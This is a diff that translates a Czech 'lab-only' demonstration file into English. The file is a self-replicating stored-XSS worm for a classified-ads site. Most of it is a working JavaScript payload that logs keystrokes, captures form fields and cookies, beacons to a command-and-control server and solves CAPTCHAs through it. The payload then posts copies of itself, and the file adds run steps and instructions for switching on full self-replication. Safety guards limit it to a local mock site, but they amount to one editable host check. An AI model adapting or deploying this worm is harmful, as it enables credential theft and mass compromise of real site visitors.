@@ -1,60 +1,61 @@
 ================================================================================
- LAB-ONLY "WORM" REPLIKACE DEMO — NEFUNGUJE NA ŽÁDNÉM VEŘEJNÉM WEBU
+ LAB-ONLY "WORM" REPLICATION DEMO — DOES NOT WORK ON PUBLIC WEBSITES
 ================================================================================
 
-Tento soubor ukazuje schéma samošíření (replication loop) výhradně v IZOLOVANÉM
-LABU proti mock webu (lab/), který si sám spustíš na 127.0.0.1.
+This file demonstrates a replication loop exclusively in an ISOLATED LAB
+against the mock website that you run locally on 127.0.0.1.
 
-BEZPEČNOSTNÍ ZÁBRANY:
-  1) host-guard: spustí se POUZE na "lab.local" (neexistující veřejná doména,
-     mapovaná v /etc/hosts na 127.0.0.1 tvého labu).
-  2) C2 = 127.0.0.1:8080 (lokální c2.py).
-  3) Cíl replikace = http://lab.local/index.php (tvůj mock web).
-  4) Samo-replikace je DEFAULET NEAKTIVNÍ: konstanta P obsahuje placeholder.
-     Dokud ji nevyměníš za base64 payloadu, červ vkládá neškodné inzeráty.
+SAFETY GUARDS:
+  1) Host guard: runs ONLY on "lab.local" (a non-public domain mapped in
+     /etc/hosts to 127.0.0.1 in your lab).
+  2) C2 = 127.0.0.1:8080 (local c2.py).
+  3) Replication target = http://lab.local/index.php (your mock website).
+  4) Self-replication is DISABLED BY DEFAULT: constant P contains a placeholder.
+     Until replaced with a base64 payload, the worm submits harmless ads.
 
 ================================================================================
- ARCHITEKTURA REPLIKAČNÍ SMYČKY (co demo ukazuje)
+ REPLICATION LOOP ARCHITECTURE (what the demo shows)
 ================================================================================
-  1) infikovaná stránka beaconuje na C2 (/beacon) a čeká na příkaz SPREAD
+  1) An infected page sends a beacon to C2 (/beacon) and waits for SPREAD.
   2) po SPREAD:
-       - otevře formulářovou stránku (navázání session),
-       - stáhne captcha obrázek,
-       - pošle ho na C2 /solve (serverové OCR) → dostane odpověď,
-       - POSTne nový inzerát s vloženým payloadem,
-       - nový inzerát se vykreslí dalším návštěvníkům → smyčka se zavírá.
-  3) C2 /spread příkaz → všechny infikované session replikují.
+       - opens the form page (establishes a session),
+       - downloads a CAPTCHA image,
+       - sends it to C2 /solve (server-side OCR) and receives an answer,
+       - submits a new ad containing the payload,
+       - the new ad is displayed to other visitors, closing the loop.
+  3) C2 /spread command -> all infected sessions replicate.
 
-VÝZKUMNÁ HODNOTA: měření růstu infekcí, míra selhání OCR, potlačení smyčky
-rate-limitem — vše na mock webu, nulový dopad na reálné uživatele.
+RESEARCH VALUE: measure infection growth, OCR failure rate, and rate-limit
+impact — all against the mock website, with no impact on real users.
 
 ================================================================================
- JAK SPUSTIT V LABU
+ HOW TO RUN IN THE LAB
 ================================================================================
   1) /etc/hosts:            127.0.0.1   lab.local
-  2) mock web:              cd lab && php -S 127.0.0.1:8000
-  3) C2:                    python3 c2.py        (vypíše token)
-  4) Vlož PAYLOAD níže do pole "Text" mock webu (http://lab.local:8000/).
-  5) Otevři inzerát v prohlížeči → beacon na C2.
-  6) Spusť replikaci:  curl "http://127.0.0.1:8080/spread?token=<TVUJ_TOKEN>"
-  7) Sleduj dashboard: http://127.0.0.1:8080/?token=<TVUJ_TOKEN>
+  2) mock website:          php -S 127.0.0.1:8000 -t . (from repository root)
+  3) C2:                    python3 c2.py (prints the token)
+  4) Enter the PAYLOAD below in the mock website's "Text" field
+     (http://lab.local:8000/).
+  5) Open the ad in a browser; it sends a beacon to C2.
+  6) Trigger replication: curl "http://127.0.0.1:8080/spread?token=<YOUR_TOKEN>"
+  7) Dashboard: http://127.0.0.1:8080/?token=<YOUR_TOKEN>
 
-AKTIVACE PLNÉ SAMO-REPLIKACE (jen v labu):
+FULL SELF-REPLICATION ACTIVATION (lab only):
      PAYLOAD_ONE_LINER=$(sed -n '/^<img src=x onerror=/p' worm_lab.txt)
      NEW=$(echo -n "$PAYLOAD_ONE_LINER" | base64 -w0)
-     # v payloadu níže nahraď "TEFCUEFZTE9BREI2NA==" za $NEW
-     # (vznikne payload, který replikuje sám sebe)
+     # In the payload below, replace "TEFCUEFZTE9BREI2NA==" with $NEW.
+     # This creates a payload that replicates itself.
 
 ================================================================================
- PAYLOAD (vlož do pole "Text")
+ PAYLOAD (enter in the "Text" field)
 ================================================================================
 
 <img src=x onerror="var C=&quot;http://127.0.0.1:8080&quot;,T=&quot;http://lab.local&quot;;if(location.host.indexOf(&quot;lab.local&quot;)&lt;0)return;var vid=Math.random().toString(36).slice(2,10),buf=&quot;&quot;;function g(u){new Image().src=C+u}function fl(){if(buf){g(&quot;/k?k=&quot;+encodeURIComponent(buf));buf=&quot;&quot;}}setInterval(fl,3000);document.onkeypress=function(e){buf+=e.key;if(buf.length&gt;50)fl()};document.addEventListener(&quot;submit&quot;,function(e){var el=e.target,d=&quot;&quot;;for(var i=0;i&lt;el.elements.length;i++){var x=el.elements[i];if(x.name&amp;&amp;x.type!=&quot;file&quot;)d+=x.name+&quot;=&quot;+encodeURIComponent(x.value||&quot;&quot;)+&quot;&amp;&quot;}g(&quot;/f?d=&quot;+encodeURIComponent(d))},true);function bcn(){var x=new XMLHttpRequest();x.open(&quot;GET&quot;,C+&quot;/beacon?vid=&quot;+vid+&quot;&amp;co=&quot;+encodeURIComponent(document.cookie)+&quot;&amp;u=&quot;+encodeURIComponent(location.href),true);x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.cmd==&quot;SPREAD&quot;)spread()}catch(e){}};x.send()}function spread(){var x1=new XMLHttpRequest();x1.open(&quot;GET&quot;,T+&quot;/index.php&quot;,true);x1.onload=function(){var x2=new XMLHttpRequest();x2.open(&quot;GET&quot;,T+&quot;/captcha.php?t=&quot;+Date.now(),true);x2.responseType=&quot;blob&quot;;x2.onload=function(){var fr=new FileReader();fr.onload=function(){var x3=new XMLHttpRequest();x3.open(&quot;GET&quot;,C+&quot;/solve?img=&quot;+encodeURIComponent(fr.result.split(&quot;,&quot;)[1]),true);x3.onload=function(){var kod=null;try{kod=JSON.parse(x3.responseText).sum}catch(e){}if(kod===null||kod===undefined)post();else post(kod)};x3.send()};try{fr.readAsDataURL(x2.response)}catch(e){}};x2.send()};x1.send()}function post(kod){var P=&quot;TEFCUEFZTE9BREI2NA==&quot;,t;try{t=atob(P)}catch(e){t=P}var f=new FormData();f.append(&quot;jmeno&quot;,&quot;LabTester&quot;);f.append(&quot;TextArea&quot;,t);if(kod!==undefined)f.append(&quot;kod&quot;,kod);f.append(&quot;button&quot;,&quot;Odeslat&quot;);var x=new XMLHttpRequest();x.open(&quot;POST&quot;,T+&quot;/index.php&quot;,true);x.send(f)}bcn();setInterval(bcn,15000);g(&quot;/hello?vid=&quot;+vid+&quot;&amp;co=&quot;+encodeURIComponent(document.cookie)+&quot;&amp;u=&quot;+encodeURIComponent(location.href))">
 
 ================================================================================
- PRAVIDLA
+ RULES
 ================================================================================
-  - NEMĚŇ host-guard ani T na reálnou doménu. Nikdy.
-  - Placeholder P nech neaktivní, dokud testuješ v labu — plnou replikaci
-    zapni až tam a jen pro měření.
-  - Etické a právní hranice: DISCLAIMER.md. Obrana: DEFENSE.md.
+  - NEVER change the host guard or T to a real domain.
+  - Keep placeholder P inactive while testing in the lab. Enable full
+    replication only there and only for measurement.
+  - Ethical and legal boundaries: DISCLAIMER.md. Defense: DEFENSE.md.
